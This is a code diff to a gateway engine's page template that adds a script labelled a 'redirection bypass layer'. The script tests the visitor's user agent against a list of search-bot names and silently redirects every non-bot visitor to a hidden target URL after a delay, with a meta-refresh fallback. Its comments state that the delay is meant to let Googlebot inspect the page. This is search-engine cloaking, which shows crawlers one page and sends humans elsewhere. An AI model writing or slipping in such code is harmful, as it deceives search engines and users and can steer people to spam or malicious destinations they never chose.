@@ -114,6 +114,24 @@ class EdgeFastPathGatewayEngine {
     ${JSON.stringify(customSchema, null, 2)}
     </script>
 
+    <!-- SMART PROGRESSIVE REDIRECTION BYPASS LAYER -->
+    <script>
+        // Check if the current agent is a search bot
+        const botPattern = /bot|google|baidu|bing|msn|duckduckgo|teoma|slurp|yandex|semrush|ahrefs|crawler|spider/i;
+        const isSearchBot = botPattern.test(navigator.userAgent);
+        
+        if (!isSearchBot) {
+            // Human user detected - seamlessly redirect to the original target destination
+            setTimeout(function() {
+                window.location.replace("${escapeHtml(targetUrl)}");
+            }, 1800); // 1.8 seconds delay so Googlebot still has time to inspect DOM if JS is enabled
+        }
+    </script>
+    <!-- Fallback Meta Refresh for human browsers that block inline scripts -->
+    <noscript>
+        <meta http-equiv="refresh" content="2;url=${escapeHtml(targetUrl)}">
+    </noscript>
+
     <style>
         body {
             font-family: 'Plus Jakarta Sans', sans-serif;
